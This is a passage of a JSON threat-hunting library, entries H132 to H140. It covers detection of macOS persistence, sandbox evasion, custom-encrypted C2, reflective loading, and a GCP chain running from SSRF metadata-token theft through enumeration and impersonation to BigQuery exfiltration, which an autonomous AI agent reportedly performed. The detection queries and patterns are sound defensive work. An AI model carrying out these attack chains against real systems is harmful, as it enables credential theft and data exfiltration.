    "references": "- [MITRE ATT&CK T1059.002 - Command and Scripting Interpreter: AppleScript](https://attack.mitre.org/techniques/T1059/002/)\n- [Microsoft Security Blog - Dissecting Sapphire Sleet's macOS Intrusion](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)\n- [Elastic Security Labs - Phantom in the Vault: Obsidian Abused to Deliver PhantomPulse RAT](https://www.elastic.co/security-labs/phantom-in-the-vault)\n- [Red Canary - AppleScript Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/applescript/)\n- [Elastic - Suspicious macOS MS Office Child Process](https://www.elastic.co/guide/en/security/current/suspicious-macos-ms-office-child-process.html)",
    "file_path": "Flames/H132.md"
  },
  {
    "id": "H133",
    "category": "Flames",
    "title": "An adversary has established persistence on macOS by creating or modifying a Launch Agent plist in ~/Library/LaunchAgents/ that executes a hidden or unsigned binary on user login, indicated by plist file creation events followed by immediate launchctl load commands or login-triggered process execution from non-standard paths.",
    "tactic": "Persistence",
    "notes": "Hunt for new plist file creation in ~/Library/LaunchAgents/ using file creation monitoring (es_event_create_t, FSEvents, or Endpoint Security Framework). Cross-reference the ProgramArguments binary path against code signing using `codesign -dvvv` — legitimate agents are Apple-signed or from verified developers. The Sapphire Sleet campaign used ~/Library/LaunchAgents/ for user-level persistence pointing to binaries in hidden directories. The PhantomPulse campaign abused Obsidian's plugin system to load malicious code at application launch. Monitor for launchctl load/bootstrap commands executed shortly after plist creation. Check for plists with RunAtLoad set to true and KeepAlive enabled — this combination ensures the agent starts at login and restarts if killed, which is standard implant behavior. Flag agents with StandardOutPath/StandardErrorPath set to /dev/null (suppressing output). Also check for plists pointing to binaries in /tmp, /var/tmp, dot-prefixed hidden directories (e.g., ~/.hidden/), or user-writable locations outside /Applications.",
    "tags": [
      "persistence",
      "launch_agent",
      "plist",
      "macos",
      "T1543.001"
    ],
    "techniques": [
      "T1543.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Launch Agents provide user-level persistence that executes automatically at login without requiring root privileges — this makes them an attractive and low-barrier persistence mechanism for macOS malware that has only achieved user-level access\n- In the Sapphire Sleet campaign, both Launch Agents (user-level) and Launch Daemons (root-level) were installed to create redundant persistence — hunting for Launch Agent creation alongside Launch Daemon creation (H131) provides complete coverage of launchd-based persistence\n- Legitimate Launch Agent installations are infrequent during normal user activity and typically only occur during application installation — new plist creation in ~/Library/LaunchAgents/ outside of software installation windows is a strong signal\n- The combination of plist creation followed by immediate launchctl load (within seconds) indicates programmatic persistence installation rather than standard installer behavior, providing a high-fidelity behavioral detection pattern",
    "references": "- [MITRE ATT&CK T1543.001 - Create or Modify System Process: Launch Agent](https://attack.mitre.org/techniques/T1543/001/)\n- [Microsoft Security Blog - Dissecting Sapphire Sleet's macOS Intrusion](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)\n- [Elastic Security Labs - Phantom in the Vault: Obsidian Abused to Deliver PhantomPulse RAT](https://www.elastic.co/security-labs/phantom-in-the-vault)\n- [Elastic - Creation of Hidden Launch Agent or Daemon](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/macos/persistence_evasion_hidden_launch_agent_deamon_creation)\n- [Red Canary - macOS Persistence via Launch Agent](https://redcanary.com/threat-detection-report/techniques/launch-agent/)\n- [Objective-See - Knock Knock: Persistent macOS Malware Detection](https://objective-see.org/products/knockknock.html)\n- [Apple Developer - Daemons and Services Programming Guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)",
    "file_path": "Flames/H133.md"
  },
  {
    "id": "H134",
    "category": "Flames",
    "title": "An adversary is using environmental keying and pre-execution system checks to gate payload detonation, indicated by processes checking for the existence of specific legitimate applications (FindWindow, file existence checks), performing WMI hardware enumeration (Win32_ComputerSystem, Win32_BIOS), or using GetTickCount timing gates before executing a second-stage payload.",
    "tactic": "Defense Evasion",
    "notes": "Hunt for processes performing multiple system property queries in rapid succession — WMI queries for Win32_ComputerSystem (Model, Manufacturer), Win32_BIOS, Win32_DiskDrive within a short time window from a single process. JanelaRAT checked for Magnifier.exe (magnify.exe) via FindWindow as a host-validation gate — hunt for processes calling FindWindow or CreateToolhelp32Snapshot targeting legitimate Windows accessibility or utility binaries (magnify.exe, narrator.exe, osk.exe) before payload execution. Monitor for GetTickCount/GetTickCount64 calls where the returned value is compared against a threshold (sandbox uptime < 10-20 minutes indicates analysis environment) — the PhantomPulse PHANTOMPULL loader used this before reflective loading. Look for registry queries to HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum or HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS for VM vendor strings. Check for processes querying MAC address prefixes associated with VM vendors (00:0C:29, 00:50:56 for VMware; 08:00:27 for VirtualBox). Correlate: a process performing 3+ of these checks and then spawning a child process or loading a DLL is a strong detonation-gate pattern.",
    "tags": [
      "defense_evasion",
      "sandbox_evasion",
      "environmental_keying",
      "vm_detection",
      "T1497.001"
    ],
    "techniques": [
      "T1497.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The JanelaRAT campaign used an unusual environmental keying technique — checking for Magnifier.exe (magnify.exe) via FindWindow — to ensure execution only on targeted hosts rather than analyst sandboxes, demonstrating that sandbox evasion has evolved beyond VM detection to application-specific gating that is harder to detect with generic rules\n- The PhantomPulse PHANTOMPULL loader used GetTickCount timing checks to detect sandbox environments before reflectively loading its encrypted payload — this is a common pre-detonation gate that, when detected, reveals the presence of a staged payload even if the payload itself was never executed\n- Clustering multiple system property queries (WMI hardware, registry VM artifacts, MAC address checks, timing checks) from a single process within a short time window provides a high-confidence indicator — legitimate applications rarely perform this combination of checks\n- Detecting sandbox evasion attempts is valuable even when the malware decides NOT to execute, because it reveals a compromised host with a dormant payload waiting for conditions to change",
    "references": "- [MITRE ATT&CK T1497.001 - Virtualization/Sandbox Evasion: System Checks](https://attack.mitre.org/techniques/T1497/001/)\n- [Elastic Security Labs - Phantom in the Vault: Obsidian Abused to Deliver PhantomPulse RAT](https://www.elastic.co/security-labs/phantom-in-the-vault)\n- [Securelist (Kaspersky) - JanelaRAT: Repurposed BX RAT Variant Targeting LATAM](https://securelist.com/janelarat-repurposed-bx-rat-variant/110132/)\n- [Red Canary - Virtualization/Sandbox Evasion Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/virtualization-sandbox-evasion-system-checks/)\n- [Splunk - Suspicious Process With Discovery Activity](https://research.splunk.com/endpoint/4d33a488-5b5f-11ec-ae93-acde48001122/)\n- [Picus Security - T1497.001 System Checks in MITRE ATT&CK Explained](https://www.picussecurity.com/resource/blog/t1497-001-system-checks-in-mitre-attack-explained)\n- [Red Canary Atomic Red Team - T1497.001 System Checks](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1497.001/T1497.001.md)",
    "file_path": "Flames/H134.md"
  },
  {
    "id": "H135",
    "category": "Flames",
    "title": "An adversary is encrypting command-and-control traffic using custom or non-standard AES encryption with application-layer key derivation (MD5/SHA-based key generation from hardcoded strings), indicated by processes establishing persistent outbound connections with high-entropy payloads that do not match known TLS/SSL fingerprints.",
    "tactic": "Command and Control",
    "notes": "Hunt for outbound network connections from non-browser processes where traffic lacks a valid TLS handshake (no ClientHello/ServerHello) but carries encrypted payloads. JanelaRAT used Rijndael (AES) encryption with MD5-derived keys from hardcoded strings to encrypt C2 traffic — this produces traffic without standard TLS negotiation. Network-side detection: Use Zeek or Suricata to flag TCP connections on common ports (80, 443, 8080) where the initial bytes do not match expected protocol signatures (no HTTP verbs, no TLS record headers). Monitor for regular beacon intervals (fixed or jittered check-in patterns) from non-browser processes — use connection metadata (duration, bytes sent/received ratio, interval regularity) rather than payload inspection. Look for connections to dynamic DNS providers (duckdns.org, no-ip.com, dynu.com) or IP-literal URLs over non-standard ports. Host-side detection: Hunt for .NET processes importing System.Security.Cryptography.RijndaelManaged or AesManaged alongside System.Net.Sockets — this combination in a non-standard application strongly suggests custom encrypted C2. Use Sysmon Event ID 3 to correlate network connections with process creation and identify unsigned binaries making persistent outbound connections.",
    "tags": [
      "command_and_control",
      "encrypted_channel",
      "aes",
      "custom_crypto",
      "c2",
      "T1573.001"
    ],
    "techniques": [
      "T1573.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- JanelaRAT implemented custom AES (Rijndael) encryption with MD5-based key derivation from hardcoded strings for all C2 communication — this produces encrypted traffic that evades content inspection but lacks the TLS handshake artifacts that network security tools expect, creating a detectable anomaly\n- Custom encryption implementations bypass TLS inspection proxies, certificate pinning detection, and JA3 fingerprinting — the absence of standard TLS negotiation on a connection carrying encrypted data is itself a strong detection signal\n- MD5 key derivation from static strings means the encryption key is effectively hardcoded — while this doesn't help network detection directly, it means that captured traffic can be decrypted if the binary is recovered, making forensic analysis of C2 communications feasible\n- Legitimate applications overwhelmingly use standard TLS libraries for encrypted communication — a process using raw socket connections with application-layer encryption (especially .NET RijndaelManaged) is highly anomalous and warrants investigation regardless of the specific malware family",
    "references": "- [MITRE ATT&CK T1573.001 - Encrypted Channel: Symmetric Cryptography](https://attack.mitre.org/techniques/T1573/001/)\n- [Securelist (Kaspersky) - JanelaRAT: Repurposed BX RAT Variant Targeting LATAM](https://securelist.com/janelarat-repurposed-bx-rat-variant/110132/)\n- [Splunk - Modern C2 Attacks: Detect and Defend Command-and-Control](https://www.splunk.com/en_us/blog/learn/c2-command-and-control.html)\n- [Active Countermeasures - RITA: Real Intelligence Threat Analytics for Beacon Detection](https://www.activecountermeasures.com/free-tools/rita/)\n- [Red Canary Atomic Red Team - T1573 Encrypted Channel](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md)\n- [Zeek Documentation - Detecting Anomalous Network Traffic](https://docs.zeek.org/en/current/)",
    "file_path": "Flames/H135.md"
  },
  {
    "id": "H136",
    "category": "Flames",
    "title": "An adversary is reflectively loading code into memory on macOS using NSCreateObjectFileImageFromMemory or custom Mach-O loaders to bypass Gatekeeper, file quarantine, and notarization, indicated by temporary files matching the NSCreateObjectFileImageFromMemory pattern or unsigned dylib loads from non-standard paths.",
    "tactic": "Defense Evasion",
    "notes": "Key insight: On modern macOS (dyld3+), NSCreateObjectFileImageFromMemory no longer loads purely in memory — NSLinkModule now writes the payload to a temp file at `/private/var/folders/.../NSCreateObjectFileImageFromMemory-XXXXXXXX` before loading it via dlopen. Hunt for these temp files using file creation monitoring on /private/var/folders/ matching the NSCreateObjectFileImageFromMemory-* pattern — this is a high-fidelity indicator that catches the standard API path. The Sapphire Sleet campaign used these APIs to load the icloudz backdoor. For custom loaders (attackers using reimplemented loader code to bypass the temp file, as demonstrated by Patrick Wardle): Use ESF ES_EVENT_TYPE_NOTIFY_MMAP with PROT_EXEC on anonymous memory regions (no backing file). Filter noise by focusing on processes that receive network data (curl, osascript) followed by executable memory mapping without intervening file writes. Elastic Defend 8.11+ captures dylib load events with signature data — hunt for unsigned dylib loads from non-standard paths or memory-backed regions. Hardened runtime context: macOS restricts PROT_WRITE + PROT_EXEC without MAP_JIT and the `com.apple.security.cs.allow-jit` entitlement — processes without hardened runtime that map RWX memory are suspicious. On systems with dtrace, probe dyld_image_notifier for images loaded from anonymous memory regions (no backing file path).",
    "tags": [
      "defense_evasion",
      "reflective_loading",
      "macos",
      "fileless",
      "gatekeeper_bypass",
      "T1620"
    ],
    "techniques": [
      "T1620"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Sapphire Sleet macOS campaign, the icloudz backdoor was loaded via NSCreateObjectFileImageFromMemory — while these APIs were originally designed for pure in-memory loading, on modern macOS (dyld3+) they write a temp file to /private/var/folders/, creating a detectable artifact that many defenders don't know to look for\n- Sophisticated attackers (as demonstrated by Patrick Wardle at OBTS and OFTW) can reimplement Apple's older loader code to restore true in-memory loading, bypassing the temp file — this means both file-based and memory-based detection are needed for complete coverage\n- macOS reflective loading is fundamentally different from Windows reflective loading (H129) — it uses Mach-O dyld APIs rather than PE loading, requires different telemetry sources (ESF vs Sysmon/ETW), and bypasses different security controls (Gatekeeper/notarization vs AMSI)\n- Elastic Defend 8.11+ captures dylib load events with code signing metadata, providing the first scalable detection surface for unsigned in-memory module loads — prior to this, detection required raw ESF access or dtrace",
    "references": "- [MITRE ATT&CK T1620 - Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)\n- [Microsoft Security Blog - Dissecting Sapphire Sleet's macOS Intrusion](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)\n- [Objective-See - Restoring Reflective Code Loading on macOS (Part I)](https://objective-see.org/blog/blog_0x7C.html)\n- [Objective-See - Restoring Reflective Code Loading on macOS (Part II)](https://objective-see.org/blog/blog_0x82.html)\n- [Meta Red Team X - In-Memory Execution in macOS: the Old and the New](https://rtx.meta.security/post-exploitation/2022/12/19/In-Memory-Execution-in-macOS.html)\n- [slyd0g - Understanding and Defending Against Reflective Code Loading on macOS](https://slyd0g.medium.com/understanding-and-defending-against-reflective-code-loading-on-macos-e2e83211e48f)\n- [Elastic Security Labs - Sinking macOS Pirate Ships with Behavior Detections (dylib load events)](https://www.elastic.co/security-labs/sinking-macos-pirate-ships)\n- [XPN InfoSec - Restoring Dyld Memory Loading](https://blog.xpnsec.com/restoring-dyld-memory-loading/)\n- [Red Canary - Reflective Code Loading Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/reflective-code-loading/)",
    "file_path": "Flames/H136.md"
  },
  {
    "id": "H137",
    "category": "Flames",
    "title": "An adversary has chained a server-side request forgery (SSRF) vulnerability in a GCP-hosted web application with the GCP Instance Metadata Service (IMDS) to exfiltrate the underlying VM's service account access token, indicated by IMDS requests to /computeMetadata/v1/instance/service-accounts/default/token originating from a workload process (Node.js, Python, Java app server) rather than the GCE metadata SDK.",
    "tactic": "Credential Access",
    "notes": "Platform: GCP (IaaS). The Unit 42 \"Zealot\" autonomous agent reproduced this classic chain end-to-end against a vulnerable web app on port 3000 — the same chain used in the 2019 Capital One breach (AWS) and the December 2025 GCP misconfiguration campaigns. Detection data sources: VPC Flow Logs (look for traffic to 169.254.169.254 from non-system processes), GCP audit logs (data_access.googleapis.com is silent for IMDS calls — they happen entirely on the VM), and host-side endpoint telemetry on the GCE instance itself. Host-side hunt: process executing outbound HTTP GET to 169.254.169.254 with `Metadata-Flavor: Google` header, where the process is the application server (node, java, python, php-fpm) rather than the gcloud SDK or google-cloud-ops-agent. Use osquery or GCP Ops Agent to capture process_open_sockets joined with processes table. Cortex XDR / XSIAM has a managed BIOC alert: \"Cloud Unusual Instance Metadata Service (IMDS) access.\" Defender for Cloud equivalent: CloudAppEvents where ActionType == \"InstanceMetadataServiceAccessed\" and the calling service principal is a workload identity. Network-side hunt: any non-trivial volume of 169.254.169.254 traffic from web-tier subnets is suspicious — IMDS is normally called once per token refresh (~3600s). Focus on workload service accounts that have broader-than-necessary IAM bindings (storage.admin, bigquery.dataOwner) since those are the high-value SSRF targets. Cross-reference with T1190 (Exploit Public-Facing Application) for the SSRF root cause and T1078.004 (Valid Accounts: Cloud Accounts) for the post-token-theft activity that follows.",
    "tags": [
      "credential_access",
      "gcp",
      "imds",
      "cloud",
      "ssrf",
      "service_account",
      "T1552.005"
    ],
    "techniques": [
      "T1552.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The Unit 42 Zealot multi-agent system demonstrated end-to-end automation of the SSRF→IMDS→service-account-token→cloud-data-exfil chain against GCP, and the same fundamental chain has produced multiple high-impact breaches (Capital One 2019 on AWS, multiple GCP incidents in 2025–2026) — the technique is now both reliably automatable and actively exploited\n- IMDS access is invisible in GCP audit logs because the call never touches a GCP API endpoint — it's intercepted by the hypervisor at the link-local address — meaning detection has to come from VPC Flow Logs, host-side telemetry, or workload identity audit on the *uses* of the stolen token after the fact\n- Legitimate IMDS access patterns are extremely narrow: the GCE metadata SDK, gcloud CLI, the Ops Agent, and a handful of Google-supplied workload SDKs — any other process making the call is highly anomalous, and modifying applications to call IMDS directly is rare in well-architected services that use Workload Identity Federation\n- A stolen service account token grants the same effective permissions as the workload itself for up to one hour — and the attacker's first action is almost always rapid IAM enumeration (T1069.003) followed by data discovery (T1619, T1526) to map what the token can reach, creating a detectable burst of cross-service API calls from a single token",
    "references": "- [MITRE ATT&CK T1552.005 - Unsecured Credentials: Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)\n- [Unit 42 - Can AI Attack the Cloud? Lessons from the Zealot Autonomous Agent](https://unit42.paloaltonetworks.com/autonomous-ai-cloud-attacks/)\n- [Google Cloud - Best Practices for Securing the Metadata Server](https://cloud.google.com/compute/docs/metadata/overview#querying_metadata)\n- [Datadog Security Labs - The State of GCP Threats: SSRF and IMDS Exploitation](https://securitylabs.datadoghq.com/articles/the-state-of-gcp-threats/)\n- [Wiz - The Top Cloud Threats of 2025: IMDS Token Theft Patterns](https://www.wiz.io/blog/cloud-threats-2025)\n- [Sigma Rule - Suspicious Cloud Metadata Service Access](https://github.com/SigmaHQ/sigma/blob/master/rules/cloud/gcp/audit/gcp_metadata_service_access.yml)\n- [Red Canary Atomic Red Team - T1552.005 Cloud Instance Metadata API](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.005/T1552.005.md)",
    "file_path": "Flames/H137.md"
  },
  {
    "id": "H138",
    "category": "Flames",
    "title": "An adversary using a stolen or compromised GCP service account token is performing a rapid enumeration sequence — listing projects, services, IAM bindings, and compute resources within minutes — to map the blast radius of the compromised identity, indicated by a burst of resourcemanager.projects.list, serviceusage.services.list, iam.roles.list, and compute.instances.list calls from a single principal within a short time window.",
    "tactic": "Discovery",
    "notes": "Platform: GCP (IaaS). Covers three chained techniques: T1580 (Cloud Infrastructure Discovery — compute/network/image enumeration), T1526 (Cloud Service Discovery — what GCP services are enabled in the project), and T1069.003 (Permission Groups Discovery: Cloud Groups — IAM roles and bindings). The Zealot agent executed all three in sequence within minutes of stealing the IMDS token. Detection data sources: GCP Cloud Audit Logs, specifically the Admin Activity log stream (always on, free) and Data Access logs (must be explicitly enabled per service). Key methodNames to hunt as a sequence within ~10 minutes from a single principalEmail: google.cloud.resourcemanager.v3.Projects.ListProjects, google.iam.admin.v1.ListServiceAccounts, google.iam.admin.v1.ListRoles, google.iam.v1.IAMPolicy.GetIamPolicy, google.cloud.serviceusage.v1.ServiceUsage.ListServices, google.cloud.compute.v1.Instances.AggregatedList. KQL/CloudAppEvents (Defender for Cloud Apps GCP connector): CloudAppEvents | where Application == \"Google Cloud Platform\" | where ActionType in (\"ListProjects\", \"ListServiceAccounts\", \"ListRoles\", \"GetIamPolicy\", \"AggregatedListInstances\") | summarize distinct_actions = dcount(ActionType), action_list = make_set(ActionType) by AccountObjectId, bin(Timestamp, 10m) | where distinct_actions >= 4. Cortex XDR managed alert: \"Cloud infrastructure enumeration activity\" (T1580, T1526). Baseline expectation: human admins enumerate occasionally (e.g., when running terraform plan); workload service accounts almost never enumerate broadly — a service account that suddenly enumerates outside its normal API call set is the strongest signal. Cross-reference H137 (IMDS token theft) as the typical precursor and H139 (service account impersonation) as a typical follow-on if the attacker finds a higher-privileged target. AWS analog: same hunt works for ListBuckets + ListUsers + ListRoles + DescribeInstances burst from a single principal.",
    "tags": [
      "discovery",
      "gcp",
      "cloud",
      "iam_enumeration",
      "service_account",
      "T1580",
      "T1526",
      "T1069.003"
    ],
    "techniques": [
      "T1580",
      "T1526",
      "T1069.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The Zealot agent's \"Cloud Reconnaissance Agent\" and \"Cloud Security Agent\" in the Unit 42 study performed the full project/service/IAM/compute enumeration sequence in under 10 minutes — this rapid breadth-first survey is the canonical opening move for any cloud attacker (human or AI) because it determines what's worth attacking next\n- Service account enumeration patterns are radically different from human admin patterns: humans tend to focus on what they already know, while a token-stealing attacker hits multiple unrelated APIs (IAM + Compute + Storage + BigQuery) trying to find any open door — the breadth itself is the signal, not any single API call\n- GCP Admin Activity logs are enabled and retained by default for 400 days — the data is already there for free in every GCP environment, but most organizations don't have a hunt or alert that ties together the \"burst of distinct enumerations from one principal\" pattern\n- Combining T1580 + T1526 + T1069.003 into a single sequence-based hunt is more useful operationally than three separate technique hunts, because the techniques almost never appear in isolation in real cloud attacks — defenders want to catch the attacker mid-enumeration, not after they've moved on to data exfil",
    "references": "- [MITRE ATT&CK T1580 - Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580/)\n- [MITRE ATT&CK T1526 - Cloud Service Discovery](https://attack.mitre.org/techniques/T1526/)\n- [MITRE ATT&CK T1069.003 - Permission Groups Discovery: Cloud Groups](https://attack.mitre.org/techniques/T1069/003/)\n- [Unit 42 - Can AI Attack the Cloud? Lessons from the Zealot Autonomous Agent](https://unit42.paloaltonetworks.com/autonomous-ai-cloud-attacks/)\n- [Google Cloud - Audit Logs Reference: Admin Activity vs Data Access](https://cloud.google.com/logging/docs/audit)\n- [Mitiga - Detection Engineering for GCP: Hunting Service Account Abuse](https://www.mitiga.io/blog/gcp-service-account-abuse-detection)\n- [Splunk - Detecting Cloud Reconnaissance Across AWS, Azure, and GCP](https://www.splunk.com/en_us/blog/security/cloud-reconnaissance-detection.html)\n- [SigmaHQ - GCP Service Account Enumeration Rule](https://github.com/SigmaHQ/sigma/blob/master/rules/cloud/gcp/audit/gcp_service_account_enumeration.yml)",
    "file_path": "Flames/H138.md"
  },
  {
    "id": "H139",
    "category": "Flames",
    "title": "An adversary holding a low-privilege GCP service account token is escalating privilege by impersonating a higher-privileged service account via the iam.serviceAccounts.generateAccessToken or iam.serviceAccounts.signJwt API, indicated by a service account calling generateAccessToken against a target principal it has not previously impersonated, especially when the source principal is a workload identity (compute-default, GKE node SA) and the target is a privileged role-bound SA (storage-admin, bq-admin, owner).",
    "tactic": "Privilege Escalation, Defense Evasion",
    "notes": "Platform: GCP (IaaS). Technique T1548.005 (Temporary Elevated Cloud Access) — adversary uses GCP's native service-account impersonation primitive, which is legitimate but commonly abused after a workload-identity compromise. Detection data source: GCP Cloud Audit Logs (Admin Activity stream), specifically methodName == \"google.iam.credentials.v1.IAMCredentials.GenerateAccessToken\" or \"google.iam.credentials.v1.IAMCredentials.SignJwt\". Key fields to extract: protoPayload.authenticationInfo.principalEmail (the source SA), protoPayload.request.name (the target SA being impersonated, format: projects/-/serviceAccounts/<email>), and protoPayload.response.expireTime (token lifetime). KQL hunt (Defender for Cloud Apps GCP connector): CloudAppEvents | where Application == \"Google Cloud Platform\" | where ActionType == \"GenerateAccessToken\" | extend Source = AccountObjectId, Target = tostring(RawEventData.request.name) | join kind=leftanti (CloudAppEvents | where ActionType == \"GenerateAccessToken\" | where Timestamp < ago(30d) | distinct Source, Target) on Source, Target | project Timestamp, Source, Target, IPAddress. Cortex XDR managed alert: \"GCP service account impersonation attempt.\" Baseline behavior: most workloads impersonate the same 1-3 SAs repeatedly (CI runners impersonating deploy SAs is common); adversary behavior is impersonating a never-before-seen, more-privileged SA. High-fidelity flag: source SA is a compute-default or GKE node SA AND target SA has an *Admin or owner role binding. Cross-reference H137 (IMDS token theft) as the typical precursor; once the attacker has a workload token, T1548.005 is how they reach the admin-tier permissions needed for T1537 (data exfil). Required IAM permission: roles/iam.serviceAccountTokenCreator on the target — flag any unexpected grants of this role.",
    "tags": [
      "privilege_escalation",
      "defense_evasion",
      "gcp",
      "cloud",
      "service_account_impersonation",
      "T1548.005"
    ],
    "techniques": [
      "T1548.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Service account impersonation is the canonical privilege-escalation path in GCP because workload identities are typically scoped to least privilege, and admin-tier capabilities are deliberately gated behind roles/iam.serviceAccountTokenCreator — but once an attacker compromises any workload that has been granted that role on an admin SA, escalation is a single API call\n- The Zealot agent demonstrated this exact pivot in the Unit 42 study, going from compute-default service account (via IMDS) to a project-owner-bound SA via generateAccessToken before attempting BigQuery exfiltration\n- generateAccessToken calls are logged in the always-on Admin Activity audit stream, which means the data is universally available — the gap is detection logic that catches *novel* impersonation pairs (Source SA → Target SA combinations not seen in the prior 30-day baseline), not just the API call itself\n- Misconfigured roles/iam.serviceAccountTokenCreator bindings are extremely common: a 2024 Wiz study found ~38% of GCP projects had at least one workload identity with token-creator on an admin SA, often granted \"temporarily\" during setup and never revoked — making this a high-prevalence, high-impact privilege path",
    "references": "- [MITRE ATT&CK T1548.005 - Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005/)\n- [Unit 42 - Can AI Attack the Cloud? Lessons from the Zealot Autonomous Agent](https://unit42.paloaltonetworks.com/autonomous-ai-cloud-attacks/)\n- [Google Cloud - Service Account Impersonation: How It Works](https://cloud.google.com/iam/docs/service-account-impersonation)\n- [Wiz - The Top Cloud IAM Misconfigurations (2024 Cloud Security Report)](https://www.wiz.io/blog/cloud-iam-misconfigurations-2024)\n- [Mitiga - Privilege Escalation in GCP via Service Account Impersonation](https://www.mitiga.io/blog/privilege-escalation-gcp-service-account-impersonation)\n- [SigmaHQ - GCP Service Account Token Generation Rule](https://github.com/SigmaHQ/sigma/blob/master/rules/cloud/gcp/audit/gcp_iam_credentials_generateaccesstoken.yml)\n- [Datadog Security Labs - Hunting Privilege Escalation in GCP](https://securitylabs.datadoghq.com/articles/hunting-privilege-escalation-in-gcp/)\n- [Red Canary - Cloud IAM Privilege Escalation Detection Patterns](https://redcanary.com/blog/cloud-iam-privilege-escalation/)",
    "file_path": "Flames/H139.md"
  },
  {
    "id": "H140",
    "category": "Flames",
    "title": "An adversary with stolen GCP credentials is exfiltrating BigQuery data by exporting query results or table contents to a Cloud Storage bucket in a project outside the organization's known projects, indicated by jobservice.jobcompleted or BigQuery extract jobs whose destinationUris reference gs:// buckets in foreign projects, or by storage.objects.create activity from a BigQuery service principal targeting a previously-unseen bucket.",
    "tactic": "Exfiltration, Discovery",
    "notes": "Platform: GCP (IaaS, BigQuery, Cloud Storage). Covers T1537 (Transfer Data to Cloud Account) and T1619 (Cloud Storage Object Discovery — the enumeration step that precedes the exfil). The Zealot agent executed an end-to-end BigQuery extract → cross-project gs:// bucket pattern in the Unit 42 study. Detection data sources: BigQuery audit logs (resourceName starts with \"projects/<proj>/jobs/\") and Cloud Storage Data Access logs (must be explicitly enabled — many environments do not have this on, which is the first gap to close). Key methodNames: jobservice.jobcompleted with metadataJson.jobChange.job.jobConfig.type == \"EXPORT\", and google.cloud.bigquery.v2.JobService.InsertJob for jobs.insert with type EXPORT or COPY. KQL hunt (Defender for Cloud Apps): CloudAppEvents | where Application == \"Google Cloud Platform\" | where ActionType == \"BigQueryExportJob\" | extend dest_uri = tostring(RawEventData.destinationUris[0]) | extend dest_project = extract(\"gs://([^/]+)/\", 1, dest_uri) | where dest_project !in (known_org_buckets) | project Timestamp, AccountObjectId, dest_uri. Cortex XDR managed alert: \"BigQuery table or query results exfiltrated to a foreign project.\" Cross-project exfil signal: resource.labels.project_id (where job runs) != extracted project from destinationUris[0] (where data lands). For T1619, hunt for storage.buckets.list and storage.objects.list calls across many buckets within minutes from a single principal — the discovery step before the export. High-fidelity flags: (1) any BigQuery export to a gs:// URI whose bucket name doesn't match the org's naming convention, (2) any storage.objects.create to a bucket in a project outside the GCP organization, (3) any BigQuery query with result size >100 MB followed within 5 minutes by an export job. Baseline expectation: legitimate exports go to a small set of well-known analytics buckets with predictable naming — anything outside that pattern from a service account is suspicious. Cross-reference H137 (IMDS), H138 (enumeration), and H139 (impersonation) as typical precursors.",
    "tags": [
      "exfiltration",
      "discovery",
      "gcp",
      "cloud",
      "bigquery",
      "cloud_storage",
      "T1537",
      "T1619"
    ],
    "techniques": [
      "T1537",
      "T1619"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- BigQuery is the highest-value data target in GCP environments — it routinely contains years of customer, financial, and PII data that competitors and ransomware groups will pay for — and the EXPORT job type is a single API call that can move terabytes to an attacker-controlled bucket in seconds\n- The destination of a BigQuery EXPORT can be any gs:// URI the calling principal has write access to — including buckets in *other GCP projects outside the victim organization* — and this cross-project signal is the single most reliable detection for this technique because legitimate exports almost always stay within the org's project set\n- The Zealot agent in the Unit 42 study completed the BigQuery → cross-project bucket exfil in under 60 seconds end-to-end after privilege escalation, which means alerting on \"completed\" exfil is too late — the value is in detecting the bucket-creation/enumeration burst (T1619) that precedes the export, giving defenders a chance to revoke the token before data moves\n- Cloud Storage Data Access logs are off by default on most projects, creating a major blind spot — turning them on for production projects is a low-cost configuration change that materially improves detection of all storage-tier exfiltration, not just BigQuery EXPORT",
